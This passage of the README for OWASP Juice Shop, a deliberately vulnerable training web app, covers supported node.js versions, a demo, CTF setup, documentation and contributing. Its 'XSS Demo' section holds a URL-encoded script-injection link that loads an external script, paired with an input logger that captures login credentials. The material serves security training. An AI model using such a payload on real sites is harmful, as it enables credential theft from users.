## Node.js version compatibility

Officially supporting the following versions of
[node.js](http://nodejs.org) in line as close as possible with the
official [node.js LTS schedule](https://github.com/nodejs/LTS). Docker
images and packaged distributions are offered accordingly:

| node.js | [Docker image](https://registry.hub.docker.com/u/bkimminich/juice-shop)             | [Packaged distributions](https://github.com/bkimminich/juice-shop/releases/latest)       |
|:--------|:------------------------------------------------------------------------------------|:-----------------------------------------------------------------------------------------|
| __9.x__ | __`latest`__ (current official release), `snapshot` (preview from `develop` branch) | `juice-shop-<version>_node9_windows_x64.zip`, `juice-shop-<version>_node9_linux_x64.tgz` |
| 8.x     |                                                                                     | `juice-shop-<version>_node8_windows_x64.zip`, `juice-shop-<version>_node8_linux_x64.tgz` |

## Demo [![Heroku](https://heroku-badge.herokuapp.com/?app=juice-shop)](http://demo.owasp-juice.shop)

Feel free to have a look at the latest version of OWASP Juice Shop:
<http://demo.owasp-juice.shop>

> This is a deployment-test and sneak-peek instance only! You are __not
> supposed__ to use this instance for your own hacking endeavours! No
> guaranteed uptime! Guaranteed stern looks if you break it!

## Customization

Via a YAML configuration file in `/config`, the OWASP Juice Shop can be
customized in its content and look & feel.

For detailed instructions and examples please refer to
[our _Customization_ documentation](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part1/customization.html).

## CTF-Extension

If you want to run OWASP Juice Shop as a Capture-The-Flag event, we
recommend you set it up along with a [CTFd](https://ctfd.io) server
conveniently using the official
[`juice-shop-ctf-cli`](https://www.npmjs.com/package/juice-shop-ctf-cli)
tool.

For step-by-step instructions and examples please refer to
[the _Hosting a CTF event_ chapter](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part1/ctf.html)
of our companion guide ebook.

## XSS Demo

To show the possible impact of
[XSS](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)), you
can download this
[docker-compose](https://raw.githubusercontent.com/wurstbrot/shake-logger/master/docker-compose.yml)-file
and run `docker-compose up` to start the juice-shop and the
shake-logger. Assume you received and (of course) clicked
[this inconspicuous phishing link](http://localhost:3000/#/search?q=%3Cscript%3Evar%20js%20%3Ddocument.createElement%28%22script%22%29;js.type%20%3D%20%22text%2Fjavascript%22;js.src%3D%22http:%2F%2Flocalhost:8080%2Fshake.js%22;document.body.appendChild%28js%29;varhash%3Dwindow.location.hash;window.location.hash%3Dhash.substr%280,8%29;%3C%2Fscript%3Eapple)
and login. Apart from the visual/audible effect, the attacker also
installed [an input logger](http://localhost:8080/logger.php) to grab
credentials! This could easily run on a 3rd party server in real life!

> You can also find a recording of this attack in action on YouTube:
> [:tv:](https://www.youtube.com/watch?v=L7ZEMWRm7LA)


## Additional Documentation

### Pwning OWASP Juice Shop [![Write Goodreads Review](https://img.shields.io/badge/goodreads-write%20review-382110.svg)](https://www.goodreads.com/review/edit/33834308)

This is the official companion guide to the OWASP Juice Shop. It will
give you a complete overview of the vulnerabilities found in the
application including hints how to spot and exploit them. In the
appendix you will even find complete step-by-step solutions to every
challenge. [Pwning OWASP Juice Shop](https://leanpub.com/juice-shop) is
published with
[GitBook](https://www.gitbook.com/book/bkimminich/pwning-owasp-juice-shop)
under
[CC BY-NC-ND 4.0](https://creativecommons.org/licenses/by-nc-nd/4.0/)
and is available **for free** in PDF, Kindle and ePub format. You can
also
[browse the full content online](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content)!

[![Pwning OWASP Juice Shop Cover](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/cover_small.jpg)](https://leanpub.com/juice-shop)

### Slide Decks

* [Introduction Slide Deck](http://bkimminich.github.io/juice-shop) in
  HTML5
* [PDF of the Intro Slide Deck](http://de.slideshare.net/BjrnKimminich/juice-shop-an-intentionally-insecure-javascript-web-application)
  on Slideshare

## Troubleshooting [![Gitter](http://img.shields.io/badge/gitter-join%20chat-1dce73.svg)](https://gitter.im/bkimminich/juice-shop)

If you need help with the application setup please check the
[TROUBLESHOOTING.md](TROUBLESHOOTING.md) or post your specific problem
or question in the
[official Gitter Chat](https://gitter.im/bkimminich/juice-shop).

## Contributing [![GitHub contributors](https://img.shields.io/github/contributors/bkimminich/juice-shop.svg)](https://github.com/bkimminich/juice-shop/graphs/contributors) [![Stories in Ready](https://badge.waffle.io/bkimminich/juice-shop.svg?label=ready&title=Ready)](http://waffle.io/bkimminich/juice-shop) [![JavaScript Style Guide](https://img.shields.io/badge/code%20style-standard-brightgreen.svg)](http://standardjs.com/) [![Crowdin](https://d322cqt584bo4o.cloudfront.net/owasp-juice-shop/localized.svg)](https://crowdin.com/project/owasp-juice-shop) [![Bountysource Activity](https://img.shields.io/bountysource/team/juice-shop/activity.svg)](https://www.bountysource.com/teams/juice-shop)

We are always happy to get new contributors on board! Please check the
following table for possible ways to do so:

| :question:                                                                                            | :bulb:                                                                                                                                                                                                                                                                                   |
|:------------------------------------------------------------------------------------------------------|:-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| Found a bug? Crashed the app? Broken challenge? Found a vulnerability that is not on the Score Board? | [Create an issue](https://github.com/bkimminich/juice-shop/issues) or [post your ideas in the chat](https://gitter.im/bkimminich/juice-shop)                                                                                                                                             |
| Want to help with development? Pull requests are highly welcome!                                      | Please refer to the [_Contribute to development_](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part3/contribution.html) and [_Codebase 101_](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part3/codebase.html) chapters of our companion guide ebook |
| Want to help with internationalization?                                                               | Find out how to join our [Crowdin project](https://crowdin.com/project/owasp-juice-shop) in [the _Helping with translations_ documentation](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part3/translation.html)                                                       |
| Anything else you would like to contribute?                                                           | Write an email to owasp_juice_shop_project@lists.owasp.org or bjoern.kimminich@owasp.org                                                                                                                                                                                                 |

## References

Did you write a blog post, magazine article or do a podcast about or
mentioning OWASP Juice Shop? Or maybe you held or joined a conference
talk or meetup session, a hacking workshop or public training where this
project was mentioned?

Add it to our ever-growing list of [REFERENCES.md](REFERENCES.md) by
forking and opening a Pull Request!

## Merchandise

* On [Spreadshirt.com](http://shop.spreadshirt.com/juiceshop) and
  [Spreadshirt.de](http://shop.spreadshirt.de/juiceshop) you can get
  some swag (Shirts, Hoodies, Mugs) with the official OWASP Juice Shop
  logo
* On
  [StickerYou.com](https://www.stickeryou.com/products/owasp-juice-shop/794)
  you can get variants of the OWASP Juice Shop logo as single stickers
  to decorate your laptop with. They can also print magnets, iron-ons,
  sticker sheets and temporary tattoos.

The most honorable way to get some stickers is to
[contribute to the project](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part3/contribution.html)
by fixing an issue, finding a serious bug or submitting a good idea for
a new challenge!

We're also happy to supply you with stickers if you organize a meetup or
conference talk where you use or talk about or hack the OWASP Juice
Shop! Just
[contact the mailing list](mailto:owasp_juice_shop_project@lists.owasp.org)
or [the project leader](mailto:bjoern.kimminich@owasp.org) to discuss
your plans! !

